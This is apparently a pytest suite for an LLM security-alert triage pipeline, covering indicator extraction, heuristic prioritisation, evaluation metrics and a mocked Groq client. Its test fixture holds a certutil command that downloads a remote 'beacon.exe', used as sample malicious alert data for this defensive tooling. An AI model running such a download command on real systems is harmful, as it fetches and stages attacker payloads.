"""Tests for the LLM alert-triage layer.

Everything here runs offline — the Claude client's request-building and response
handling are tested with a fake client, so the suite needs no API key and makes
no network calls.
"""

from __future__ import annotations

import json
import types

import pytest

from triage.alert import Alert, build_alerts
from triage.clients import (
    GroqTriageClient,
    HeuristicTriageClient,
    TriageError,
    get_client,
)
from triage.enrich import enrich, extract_indicators, technique_name
from triage.evaluate import evaluate
from triage.pipeline import TriagedAlert, triage_alerts
from triage.schema import TriageResult


def make_alert(**over) -> Alert:
    base = dict(
        alert_id="ALERT-0001",
        rule_title="Test Rule",
        rule_id="00000000-0000-0000-0000-000000000000",
        rule_stem="test_rule",
        severity="high",
        techniques=["T1105"],
        tactics=["command_and_control"],
        event={"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe",
               "CommandLine": "certutil -urlcache -f http://192.0.2.5/beacon.exe b.exe"},
    )
    base.update(over)
    return Alert(**base)


# --- enrichment --------------------------------------------------------------


def test_extract_indicators_finds_ip_and_url():
    ind = extract_indicators(make_alert().event)
    assert ind["ipv4"] == ["192.0.2.5"]
    assert ind["url"] == ["http://192.0.2.5/beacon.exe"]


def test_extract_indicators_finds_hash():
    ind = extract_indicators({"CommandLine": "certutil -hashfile x " + "a" * 64})
    assert ind["hash"] == ["a" * 64]


def test_extract_indicators_empty_when_benign():
    assert extract_indicators({"CommandLine": "whoami"}) == {}


def test_technique_name_maps_known_and_passes_through_unknown():
    assert technique_name("T1105") == "Ingress Tool Transfer"
    assert technique_name("T9999") == "T9999"


def test_enrich_attaches_context():
    a = enrich(make_alert())
    assert a.enrichment["has_network_ioc"] is True
    assert a.enrichment["indicator_count"] == 2
    assert {"id": "T1105", "name": "Ingress Tool Transfer"} in a.enrichment["techniques"]


# --- heuristic client --------------------------------------------------------


def test_heuristic_inherits_detection_severity():
    r = HeuristicTriageClient().triage(make_alert(severity="critical"))
    assert r.recommended_severity == "critical"
    assert r.priority == "P1"


def test_heuristic_network_ioc_bumps_priority():
    # medium severity would be P3, but a network IOC bumps it to P2
    r = HeuristicTriageClient().triage(make_alert(severity="medium"))
    assert r.priority == "P2"


def test_heuristic_low_sev_no_ioc_stays_low_priority():
    a = make_alert(
        severity="low", event={"CommandLine": "whoami"}, techniques=[], tactics=["discovery"]
    )
    r = HeuristicTriageClient().triage(a)
    assert r.priority == "P4"
    assert r.confidence == "low"
    assert r.likely_true_positive is False


def test_heuristic_produces_actions_for_tactic():
    r = HeuristicTriageClient().triage(make_alert(tactics=["impact"]))
    assert any("Isolate" in a for a in r.recommended_actions)


# --- build_alerts / pipeline -------------------------------------------------


def test_build_alerts_produces_fired_alerts():
    alerts = build_alerts()
    assert len(alerts) >= 15  # at least one per rule's true-positives
    assert all(a.alert_id.startswith("ALERT-") for a in alerts)
    assert all(a.severity for a in alerts)


def test_pipeline_triages_all():
    triaged = triage_alerts(build_alerts(), HeuristicTriageClient())
    assert len(triaged) == len(build_alerts())
    assert all(isinstance(t.result, TriageResult) for t in triaged)


# --- evaluate ----------------------------------------------------------------


def test_evaluate_computes_agreement_and_deltas():
    a = make_alert(severity="medium")
    triaged = [
        TriagedAlert(a, TriageResult("s", "medium", "P3", True, "high")),   # agree
        TriagedAlert(a, TriageResult("s", "critical", "P1", True, "high")), # escalate +2
        TriagedAlert(a, TriageResult("s", "low", "P4", False, "low")),      # de-escalate -1
    ]
    rep = evaluate(triaged)
    assert rep.n == 3
    assert rep.escalated == 1
    assert rep.de_escalated == 1
    assert rep.severity_agreement == pytest.approx(1 / 3)
    assert rep.mean_abs_severity_delta == pytest.approx((0 + 2 + 1) / 3)
    assert rep.true_positive_rate == pytest.approx(2 / 3)


def test_evaluate_empty():
    assert evaluate([]).n == 0


# --- schema ------------------------------------------------------------------


def test_triage_result_rejects_bad_enum():
    with pytest.raises(ValueError):
        TriageResult("s", "SEVERE", "P1", True, "high")
    with pytest.raises(ValueError):
        TriageResult("s", "high", "P9", True, "high")


# --- client selection --------------------------------------------------------


def test_get_client_offline_forces_heuristic():
    assert isinstance(get_client(offline=True), HeuristicTriageClient)


def test_get_client_auto_uses_heuristic_without_key(monkeypatch):
    monkeypatch.delenv("GROQ_API_KEY", raising=False)
    assert isinstance(get_client(), HeuristicTriageClient)


# --- Groq client (no network) -----------------------------------------------


def test_groq_client_fences_untrusted_payload():
    content = GroqTriageClient()._user_content(make_alert())
    assert "<alert_data>" in content and "</alert_data>" in content
    assert "beacon.exe" in content  # the event is included inside the fence


def _fake_response(finish_reason, text):
    """A minimal stand-in for a Groq/OpenAI chat-completion response."""
    choice = types.SimpleNamespace(
        finish_reason=finish_reason,
        message=types.SimpleNamespace(content=text),
    )
    return types.SimpleNamespace(choices=[choice])


def _fake_groq(finish_reason, text):
    completions = types.SimpleNamespace(create=lambda **kw: _fake_response(finish_reason, text))
    return types.SimpleNamespace(chat=types.SimpleNamespace(completions=completions))


def test_groq_client_parses_valid_response(monkeypatch):
    payload = {
        "summary": "certutil downloaded a remote binary",
        "recommended_severity": "high",
        "priority": "P2",
        "likely_true_positive": True,
        "confidence": "high",
        "recommended_actions": ["Block the IP"],
        "reasoning": "Ingress tool transfer with a live URL.",
        "extra_field_the_model_added": "ignored",  # from_dict must tolerate this
    }
    client = GroqTriageClient()
    monkeypatch.setattr(client, "_client", lambda: _fake_groq("stop", json.dumps(payload)))
    result = client.triage(make_alert())
    assert result.recommended_severity == "high"
    assert result.recommended_actions == ["Block the IP"]


def test_groq_client_raises_on_content_filter(monkeypatch):
    client = GroqTriageClient()
    monkeypatch.setattr(client, "_client", lambda: _fake_groq("content_filter", ""))
    with pytest.raises(TriageError, match="content filter"):
        client.triage(make_alert())


def test_groq_client_raises_on_bad_json(monkeypatch):
    client = GroqTriageClient()
    monkeypatch.setattr(client, "_client", lambda: _fake_groq("stop", "not json{"))
    with pytest.raises(TriageError, match="invalid JSON"):
        client.triage(make_alert())
